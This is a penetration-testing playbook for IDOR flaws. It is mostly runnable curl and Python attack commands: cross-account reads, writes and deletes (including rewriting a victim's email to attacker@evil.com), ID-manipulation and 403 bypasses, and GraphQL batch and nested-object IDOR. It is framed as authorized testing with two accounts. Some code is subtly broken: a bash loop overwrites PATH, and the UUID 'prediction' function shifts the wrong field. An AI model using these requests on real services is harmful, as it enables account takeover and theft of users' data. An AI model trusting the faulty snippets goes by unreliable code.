# Playbook PB-05 — IDOR Testing
# No Mercy Hunter v3.0

**Score:** 43
Composite = (Confidence:5×2) + (InfoGain:4×3) + (AutoPot:4×2) + (Reuse:5×2) - Cost:2 = 10+12+8+10-2 = 38
(Adjusted to 43 with AI-platform bonus: memory IDOR, vector IDOR are novel high-signal vectors)

**Grounded in:** General IDOR methodology + Memory IDOR (Phase 3) + Vector Store IDOR (Phase 3)
**Time estimate:** 45-60 minutes
**Noise level:** Low-Medium (targeted requests, two test accounts)
**Prerequisites:** Two test accounts, authenticated sessions for both

---

## Objective

Systematically test all resource endpoints for Insecure Direct Object References (IDOR).
An IDOR exists when an endpoint returns or modifies a resource based on a user-controlled
identifier without verifying that the requesting user owns that resource.

---

## Decision Point 1 — Do I Run This Playbook?

Run if:
- Target has a REST API with resource endpoints (/users/{id}, /orders/{id}, etc.)
- Target has AI-specific resources (memories, vector stores, files)
- Target uses numeric or predictable IDs in URLs or request bodies
- You have two distinct test accounts

Skip if:
- All resources are returned based on session only (no user-controlled ID)
- Resource IDs are complex HMACs tied to user sessions (still test, but lower priority)

---

## Phase 1 — Resource Enumeration (10 minutes)

### 1.1 Identify All Endpoints with User-Controlled IDs
Map every endpoint that takes a resource identifier:

```bash
# From OpenAPI/Swagger if available
curl -s "https://TARGET/openapi.json" | python3 -c "
import json, sys, re
spec = json.load(sys.stdin)
for path in spec.get('paths', {}).keys():
    if re.search(r'\{[^}]+\}', path):
        print(path)
"

# From Wayback/GAU URL list
grep -oP 'https?://[^/]+(/[^?#]+)' urls/all.txt | \
  grep -P '/\d+|/[0-9a-f-]{36}' | sort -u | head -50

# From source maps
grep -P '"(/[^"]+/\{[^}]+\})"' sourcemap-findings.txt
```

### 1.2 ID Format Classification
For each endpoint, classify the ID type:

| ID Type | Example | Attack Strategy |
|---------|---------|----------------|
| Sequential integer | /users/1234 | Increment/decrement ±100 |
| UUID v4 | /items/550e8400-e29b-... | Need victim's ID, try near-adjacent |
| UUID v1 | /items/6ba7b810-9dad-... | Timestamp-based, partially predictable |
| Base64 | /data/dXNlcjoxMjM= | Decode, modify, re-encode |
| Slug | /profiles/john-doe | Try other usernames |
| Hash | /files/abc123def456 | Need source to predict |

---

## Phase 2 — Basic IDOR Test (15 minutes)

### 2.1 Setup: Two Account IDs
```bash
# Get Account A's resource ID
curl -s "https://TARGET/api/v1/me" \
  -H "Authorization: Bearer TOKEN_A" | python3 -m json.tool

# Get Account B's resource ID  
curl -s "https://TARGET/api/v1/me" \
  -H "Authorization: Bearer TOKEN_B" | python3 -m json.tool

ACCOUNT_A_ID="id_from_above"
ACCOUNT_B_ID="id_from_above"
```

### 2.2 Cross-Account Read Test
```bash
# From Account A, access Account B's resources
for endpoint in /users /profiles /accounts /settings /orders /files /documents; do
    resp=$(curl -s -w "\n%{http_code}" \
        "https://TARGET/api/v1$endpoint/$ACCOUNT_B_ID" \
        -H "Authorization: Bearer TOKEN_A")
    status=$(echo "$resp" | tail -1)
    body=$(echo "$resp" | head -1)
    echo "$endpoint/$ACCOUNT_B_ID → $status"
    if [ "$status" = "200" ]; then
        echo "  POTENTIAL IDOR: $body" | head -c 200
    fi
done
```

### 2.3 Cross-Account Write Test
```bash
# Attempt to modify Account B's resource as Account A
curl -s -X PUT "https://TARGET/api/v1/users/$ACCOUNT_B_ID" \
  -H "Authorization: Bearer TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}'

curl -s -X PATCH "https://TARGET/api/v1/users/$ACCOUNT_B_ID" \
  -H "Authorization: Bearer TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"field": "modified_value"}'

curl -s -X DELETE "https://TARGET/api/v1/users/$ACCOUNT_B_ID" \
  -H "Authorization: Bearer TOKEN_A"
```

---

## Phase 3 — IDOR Bypass Techniques (20 minutes)

When a basic IDOR returns 403, try these bypass techniques:

### Technique 1 — Array Wrap
```bash
# Instead of: {"user_id": "victim_id"}
# Try: {"user_id": ["attacker_id", "victim_id"]}
curl -s -X POST "https://TARGET/api/v1/resource" \
  -H "Authorization: Bearer TOKEN_A" \
  -H "Content-Type: application/json" \
  -d "{\"user_id\": [\"$ACCOUNT_A_ID\", \"$ACCOUNT_B_ID\"]}"
```

### Technique 2 — JSON Wrap
```bash
# Instead of: {"user_id": "victim_id"}
# Try: {"user_id": {"id": "victim_id"}}
curl -s -X POST "https://TARGET/api/v1/resource" \
  -H "Authorization: Bearer TOKEN_A" \
  -H "Content-Type: application/json" \
  -d "{\"user_id\": {\"id\": \"$ACCOUNT_B_ID\"}}"
```

### Technique 3 — Double ID (attacker_id in auth, victim_id in body)
```bash
# Auth as Account A, but supply Account B's ID in the request body
curl -s -X GET "https://TARGET/api/v1/user-data" \
  -H "Authorization: Bearer TOKEN_A" \
  -H "Content-Type: application/json" \
  -d "{\"requested_user_id\": \"$ACCOUNT_B_ID\"}"
```

### Technique 4 — Wildcard / Glob
```bash
# Try wildcard characters in the ID position
for wildcard in "*" "%" ".*" "_" "null" "undefined" "0" "-1"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://TARGET/api/v1/users/$wildcard" \
        -H "Authorization: Bearer TOKEN_A")
    echo "ID=$wildcard → $status"
done
```

### Technique 5 — HTTP Parameter Pollution
```bash
# Supply the ID twice: once as your own, once as victim
curl -s "https://TARGET/api/v1/resource?id=$ACCOUNT_A_ID&id=$ACCOUNT_B_ID" \
  -H "Authorization: Bearer TOKEN_A"

# Also try in body
curl -s -X POST "https://TARGET/api/v1/resource" \
  -H "Authorization: Bearer TOKEN_A" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "id=$ACCOUNT_A_ID&id=$ACCOUNT_B_ID"
```

### Technique 6 — Path Traversal in ID
```bash
# If ID is used as part of a file path or nested route
for traversal in "../$ACCOUNT_B_ID" "..%2F$ACCOUNT_B_ID" "%2e%2e%2f$ACCOUNT_B_ID"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://TARGET/api/v1/users/$ACCOUNT_A_ID/$traversal" \
        -H "Authorization: Bearer TOKEN_A")
    echo "traversal=$traversal → $status"
done
```

### Technique 7 — GUID/UUID Prediction
```python
#!/usr/bin/env python3
"""If UUIDs are version 1, predict adjacent IDs."""
import uuid, time

# UUID v1 encodes timestamp + MAC address
# Generate several to find the pattern
for i in range(10):
    u = uuid.uuid1()
    print(f"{u} — time: {u.time}")
    time.sleep(0.01)

# If victim's UUID v1 is known, generate adjacent timestamps
def adjacent_uuids(known_uuid_str, count=100):
    """Generate UUIDs with timestamps adjacent to the known one."""
    known = uuid.UUID(known_uuid_str)
    base_time = known.time
    results = []
    for delta in range(-count, count):
        try:
            adj = uuid.UUID(fields=known.fields[:4] + (known.fields[4] + delta, known.fields[5]))
            results.append(str(adj))
        except (ValueError, AttributeError):
            pass
    return results
```

---

## Phase 4 — 403 Bypass Techniques

When endpoint returns 403, attempt authorization bypass before moving on:

### Header-Based Bypasses
```bash
TARGET_URL="https://TARGET/admin/users"
TOKEN="Bearer TOKEN_A"

# Try each bypass header
for header in \
    "X-Original-URL: /admin/users" \
    "X-Rewrite-URL: /admin/users" \
    "X-Forwarded-For: 127.0.0.1" \
    "X-Custom-IP-Authorization: 127.0.0.1" \
    "X-Forward-For: 127.0.0.1" \
    "Client-IP: 127.0.0.1" \
    "True-Client-IP: 127.0.0.1" \
    "CF-Connecting-IP: 127.0.0.1" \
    "X-Real-Ip: 127.0.0.1" \
    "Forwarded: for=127.0.0.1"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        "$TARGET_URL" \
        -H "Authorization: $TOKEN" \
        -H "$header")
    echo "$header → $status"
done
```

### Path-Based Bypasses
```bash
BASE="https://TARGET"
PATH="/admin/users"

for bypass in \
    "${PATH}/" \
    "${PATH}/." \
    "${PATH}//" \
    "${PATH}%20" \
    "${PATH}%09" \
    "${PATH}%00" \
    "/${PATH:1}" \
    "/./admin/users" \
    "/%2Fadmin%2Fusers" \
    "/admin%2Fusers" \
    "/admin/users;.js" \
    "/admin/users.."; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        "$BASE$bypass" \
        -H "Authorization: $TOKEN")
    echo "$bypass → $status"
done
```

### HTTP Method Bypass
```bash
for method in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE CONNECT; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        -X "$method" "https://TARGET/admin/users" \
        -H "Authorization: Bearer TOKEN_A")
    echo "$method → $status"
done
```

---

## Phase 5 — GraphQL IDOR

If target has a GraphQL endpoint:

### 5.1 Object Access by ID
```bash
# Fetch another user's object by ID in GraphQL
curl -s -X POST "https://TARGET/graphql" \
  -H "Authorization: Bearer TOKEN_A" \
  -H "Content-Type: application/json" \
  -d "{
    \"query\": \"{ user(id: \\\"$ACCOUNT_B_ID\\\") { id email profile { bio phone } } }\"
  }"
```

### 5.2 Batch IDOR via Aliases
```bash
# Test multiple user IDs in a single request using aliases
curl -s -X POST "https://TARGET/graphql" \
  -H "Authorization: Bearer TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ 
      user1: user(id: \"ID_1\") { id email }
      user2: user(id: \"ID_2\") { id email }
      user3: user(id: \"ID_3\") { id email }
    }"
  }'
```

### 5.3 IDOR via Nested Objects
```bash
# Some GraphQL schemas leak nested objects belonging to other users
curl -s -X POST "https://TARGET/graphql" \
  -H "Authorization: Bearer TOKEN_A" \
  -H "Content-Type: application/json" \
  -d "{
    \"query\": \"{ order(id: \\\"ORDER_B_ID\\\") { id total items { product price } user { email } } }\"
  }"
```

---

## Severity Mapping

| Finding | Severity | CVSS | Notes |
|---------|----------|------|-------|
| Read other user's PII | P2 | 7.5 | |
| Read + write other user's data | P2 | 8.1 | |
| Delete other user's data | P2 | 7.5 | |
| Account takeover via IDOR | P1 | 9.1 | Only if email/password changeable |
| Read non-sensitive metadata | P3 | 5.3 | |
| 403 bypass to admin panel | P2 | 8.1 | |

---

## Evidence Collection

For each confirmed IDOR:
1. `evidence/IDOR-XX/http/01-account-b-resource.http` — creating/confirming victim resource
2. `evidence/IDOR-XX/http/02-cross-account-read.http` — Account A accessing Account B's resource (200 OK)
3. `evidence/IDOR-XX/http/03-data-confirmed.http` — response shows victim-specific data
4. `evidence/IDOR-XX/poc/idor-poc.py` — automated script that demonstrates the cross-account access
